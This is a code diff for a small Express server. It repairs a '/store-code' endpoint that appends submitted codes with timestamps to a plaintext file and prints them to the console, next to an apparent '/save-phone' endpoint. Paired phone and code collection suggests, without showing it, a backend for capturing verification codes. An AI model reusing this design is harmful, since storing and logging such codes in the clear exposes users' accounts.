@@ -43,31 +43,23 @@ app.post('/save-phone', (req, res) => {
 
 app.post('/store-code', (req, res) => {
   const code = req.body.code;
+  const timestamp = new Date().toISOString();
   if (!code) {
     return res.status(400).json({ error: 'No code received' });
   }
 
-  // Create the file if it doesn't exist and append the code
-  fs.appendFile(filePath, `${new Date().toISOString()} - ${code}\n`, (err) => {
-    if (err) {
-      console.error('Error writing code:', err);
-      return res.status(500).json({ error: 'Failed to save code' });
-    }
-    console.log('Code saved:', code);
-    res.json({ status: 'success' });
-  });
-});
-  const timestamp = new Date().toISOString();
   const entry = `${timestamp} - Code: ${code}\n`;
+  const filePath = path.join(__dirname, 'codes.txt');
 
   fs.appendFile(filePath, entry, (err) => {
     if (err) {
-      console.error('Error saving code:', err);
-      return res.status(500).json({ error: 'Failed to save code' });
+      console.error('Error writing to file:', err);
+      return res.status(500).send('Failed to save code');
     }
-    console.log('Code saved:', code);
-    res.status(200).json({ status: 'success' });
+    console.log('Code saved:', entry);
+    res.send('Code saved');
   });
+});
 
 app.listen(PORT, () => {
   console.log(`Server running at http://localhost:${PORT}`);
